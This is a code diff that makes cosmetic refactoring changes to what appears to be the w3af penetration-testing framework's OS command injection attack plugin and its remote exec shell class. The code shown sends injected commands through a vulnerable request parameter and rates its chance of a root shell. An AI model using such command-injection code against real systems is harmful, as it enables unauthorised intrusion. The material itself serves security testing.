@@ -125,10 +125,10 @@ class os_commanding(AttackPlugin):
             rand = rand + '\n'
             
         # Lets define the result header and footer.
-        functionReference = getattr( self._uri_opener , vuln.get_method() )
+        func_ref = getattr( self._uri_opener , vuln.get_method() )
         exploitDc[vuln.getVar()] = command
         try:
-            response = functionReference( vuln.getURL(), str(exploitDc) )
+            response = func_ref( vuln.getURL(), str(exploitDc) )
         except w3afException, e:
             om.out.error( str(e) )
             return False
@@ -193,10 +193,12 @@ class os_commanding(AttackPlugin):
 
     def getRootProbability( self ):
         '''
-        @return: This method returns the probability of getting a root shell using this attack plugin.
-        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
-        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
-        return a root shell.
+        @return: This method returns the probability of getting a root shell
+                 using this attack plugin. This is used by the "exploit *"
+                 function to order the plugins and first try to exploit the
+                 more critical ones. This method should return 0 for an exploit
+                 that will never return a root shell, and 1 for an exploit that
+                 WILL ALWAYS return a root shell.
         '''
         return 0.8
         
@@ -228,11 +230,11 @@ class OSCommandingShell(exec_shell):
         @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        functionReference = getattr( self._uri_opener , self.get_method() )
+        func_ref = getattr( self._uri_opener , self.get_method() )
         exploit_dc = self.getDc()
         exploit_dc[ self.getVar() ] = self['separator'] + command
         try:
-            response = functionReference( self.getURL() , str(exploit_dc) )
+            response = func_ref( self.getURL() , str(exploit_dc) )
         except w3afException, e:
             return 'Error "' + str(e) + '" while sending command to remote host. Please try again.'
         else:
